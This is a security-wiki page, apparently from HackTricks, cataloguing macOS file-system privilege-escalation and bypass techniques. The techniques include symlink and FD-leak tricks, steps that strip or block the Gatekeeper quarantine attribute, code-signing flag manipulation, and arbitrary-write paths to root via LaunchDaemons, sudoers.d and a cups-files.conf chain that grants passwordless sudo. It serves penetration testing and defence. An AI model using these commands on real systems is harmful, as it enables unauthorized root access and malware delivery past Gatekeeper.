# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

For a **directory**, the three permission bits mean something different from what they mean on a regular file. `chmod(1)` calls the execute bit "**search**" when it is applied to a directory:<sup>[[2]](#references)</sup>

> `0100` For files, allow execution by owner. For directories, allow the owner to **search** in the directory.

- **read** - you can **enumerate** the directory entries (list the names).
- **write** - you can **create, rename and delete entries** in the directory. Note this is a property of the *containing* directory, not of the file: you can delete a file you cannot read or write, as long as you can write its parent directory.
  - To delete a **subdirectory** it must be empty, which in turn requires enough rights to remove everything inside it.
  - If the directory has the **sticky bit** (`S_ISVTX`, like `/tmp`) this is restricted — POSIX states that a process may then remove or rename files in it only if it owns the file, owns the directory, or has appropriate privileges.<sup>[[1]](#references)</sup>
- **execute / search** - you are **allowed to traverse** the directory. Pathname resolution locates each component "in the directory specified by its predecessor", so **losing search rights on any single component of the path prefix makes everything below it unreachable by path**, even if the leaf file itself is world-readable.<sup>[[1]](#references)</sup>

### Dangerous Combinations

**How to overwrite a file/folder owned by root**, but:

- One parent **directory owner** in the path is the user
- One parent **directory owner** in the path is a **users group** with **write access**
- A users **group** has **write** access to the **file**

With any of the previous combinations, an attacker could **inject** a **sym/hard link** the expected path to obtain a privileged arbitrary write.

### Folder root R+X special case

This falls straight out of the pathname-resolution rule above. If a **directory only grants R+X to root**, the files inside it are unreachable *by path* for everybody else — but the **files' own permission bits may still be permissive**. The directory is the only thing standing in the way.

So any primitive that lets you get the file **out of that directory** — a privileged process that **moves/renames/copies** an attacker-chosen path into a location you *can* traverse — turns into an arbitrary read, without ever needing to defeat the file's own mode:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Look for privileged file movers (installers, log rotators, crash/diagnostic collectors, backup and "export" features) that accept a source path from a lower-privileged user.

## Symbolic Link / Hard Link

### Permissive file/folder

If a privileged process is writing data in **file** that could be **controlled** by a **lower privileged user**, or that could be **previously created** by a lower privileged user. The user could just **point it to another file** via a Symbolic or Hard link, and the privileged process will write on that file.

Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.

### Open `O_NOFOLLOW`

Per [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Only the **final** component is checked — every **intermediate** component is still resolved and followed. So a developer who "protected" a write with `O_NOFOLLOW` can still be attacked by planting a symlink on any **parent directory** of the target path.<sup>[[3]](#references)</sup>

The same man page documents the flags that actually close that gap:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

Otherwise, `openat()` relative to a directory FD you already validated, or `realpath()` + re-validation, are the remaining ways to stop mid-path symlink swaps.

## .fileloc

Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## File Descriptors

### Leak FD (no `O_CLOEXEC`)

If a call to `open` doesn't have the flag `O_CLOEXEC` the file descriptor will be inherited by the child process. So, if a privileged process opens a privileged file and executes a process controlled by the attacker, the attacker will **inherit the FD over the privileged file**.

The canonical example is the **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` honoured `DYLD_PRINT_TO_FILE=/path` even in **restricted (suid root) binaries**, because that particular variable was parsed outside of `processDyldEnvironmentVariable()`.
- It did `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, so it **created a root-owned file at an arbitrary path**.
- The FD was **never closed and had no close-on-exec flag**, so every child of the suid binary inherited a **writable FD to a root-owned file**.
- Running e.g. `DYLD_PRINT_TO_FILE=/etc/target suid_binary` and then reading the inherited FD number in the child gave arbitrary root-owned writes; `fcntl(fd, F_SETFL, 0)` even cleared `O_APPEND` to allow overwriting instead of appending.

The same shape shows up whenever a privileged process opens a file **before** `exec`ing something you control (helper tools, `crontab`-style editors invoked through `$EDITOR`, log/debug files opened from an env-var path...). Enumerate the FDs you inherited with:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Anything above `2` that points to a file you cannot open yourself is an arbitrary-write (or arbitrary-read) primitive.

## Avoid quarantine xattrs tricks

### Remove it

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable flag

If a file/folder has this immutable attribute it won't be possible to put an xattr on it

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### File systems without xattr support

Not every file system macOS can mount stores **extended attributes** natively. HFS+ and APFS do; **FAT32, exFAT and (most) NFS mounts do not** — macOS emulates them by writing an **AppleDouble** side file named `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

That matters for quarantine, because the xattr only survives if it can actually be written **and read back** from the same volume:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

If the volume is later read on a path that ignores the `._` companion (or the companion is stripped/deleted), the file arrives **without a quarantine flag** — and an unquarantined `.app` is enough to escape the App Sandbox, as covered in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

This ACL prevents from adding `xattrs` to the file

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```

### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format copies a file including its ACEs.

In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:

Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.<sup>[[6]](#references)</sup>

To replicate this we first need to get the correct acl string:

```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```

(Note that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

Some security checks check if the binary is a **platform binary**, for example to allow to connect to a XPC service. However, as exposed in on bypass in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ it's possible to bypass this check by getting a platform binary (like /bin/ls) and inject the exploit via dyld using en env variable `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

It's possible for an executing binary to modify it's own flags to bypass checks with a code such as:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Bypass Code Signatures

Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.

However, there are some files whose signature won't be checked, these have the key omit in the plist, like:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

It's possible to calculate the signature of a resource from the cli with:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Mount dmgs

A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Usually macOS mounts disk talking to the `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (provided by `/usr/libexec/diskarbitrationd`). If adding the param `-d` to the LaunchDaemons plist file and restarted, it will store logs it will store logs in `/var/log/diskarbitrationd.log`.\
However, it's possible to use tools like `hdik` and `hdiutil` to communicate directly with the `com.apple.driver.DiskImages` kext.

## Arbitrary Writes

### Periodic sh scripts

If your script could be interpreted as a **shell script** you could overwrite the **`/etc/periodic/daily/999.local`** shell script that will be triggered every day.

You can **fake** an execution of this script with: **`sudo periodic daily`**

### Daemons

Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.

### cups-files.conf

This technique was used in [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Create the file `/etc/cups/cups-files.conf` with the following content:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

This will create the file `/etc/sudoers.d/lpe` with permissions 777. The extra junk at the end is to trigger the error log creation.

Then, write in `/etc/sudoers.d/lpe` the needed config to escalate privileges like `%staff ALL=(ALL) NOPASSWD:ALL`.

Then, modify the file `/etc/cups/cups-files.conf` again indicating `LogFilePerm 700` so the new sudoers file becomes valid invoking `cupsctl`.

### Sandbox Escape

It's posisble to escape the macOS sandbox with a FS arbitrary write. For some examples check the page [macOS Auto Start](../../../../macos-auto-start-locations.md) but a common one is to write a Terminal preferences file in `~/Library/Preferences/com.apple.Terminal.plist` that executes a command at startup and call it using `open`.

## Generate writable files as other users

A very common privesc primitive is making a **privileged process create a file for you** in a directory you control, and then keeping **write access** to that file. Two ingredients are needed:

1. A directory you own (or where you can set an **inheritable ACL**), so anything created inside inherits your permissions.
2. A privileged/`suid` process that can be told **where** to create a file — typically through a debug/logging environment variable, a config file, or a helper's XPC API.

The **inheritable ACL** part is what makes the created file writable by you even though it is owned by another user. The `file_inherit` / `directory_inherit` inheritance flags are documented in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Now any file that a privileged process creates inside `$DIRNAME` is **writable by you**. If that directory is also a location that is later **executed as root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, a LaunchDaemon directory...), this is a direct root escalation. See the [Sudoers File](#sudoers-file) and [cups-files.conf](#cups-filesconf) sections above for what to write once you have the file.

For a full worked example of the "env variable makes a root process create a file, and the FD leaks to you" chain, see [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) above.

## POSIX Shared Memory

**POSIX shared memory** allows processes in POSIX-compliant operating systems to access a common memory area, facilitating faster communication compared to other inter-process communication methods. It involves creating or opening a shared memory object with `shm_open()`, setting its size with `ftruncate()`, and mapping it into the process's address space using `mmap()`. Processes can then directly read from and write to this memory area. To manage concurrent access and prevent data corruption, synchronization mechanisms such as mutexes or semaphores are often used. Finally, processes unmap and close the shared memory with `munmap()` and `close()`, and optionally remove the memory object with `shm_unlink()`. This system is especially effective for efficient, fast IPC in environments where multiple processes need to access shared data rapidly.

<details>

<summary>Producer Code Example</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Consumer Code Example</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** are a security feature introduced in macOS to enhance the safety and reliability of **file descriptor operations** in user applications. These guarded descriptors provide a way to associate specific restrictions or "guards" with file descriptors, which are enforced by the kernel.

This feature is particularly useful for preventing certain classes of security vulnerabilities such as **unauthorized file access** or **race conditions**. These vulnerabilities occurs when for example a thread is accessing a file description giving **another vulnerable thread access over it** or when a file descriptor is **inherited** by a vulnerable child process. Some functions related to this functionality are:

- `guarded_open_np`: Opens a file descriptor with a guard
- `guarded_close_np`: Close it
- `change_fdguard_np`: Change guard flags on a descriptor (even removing the guard protection)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
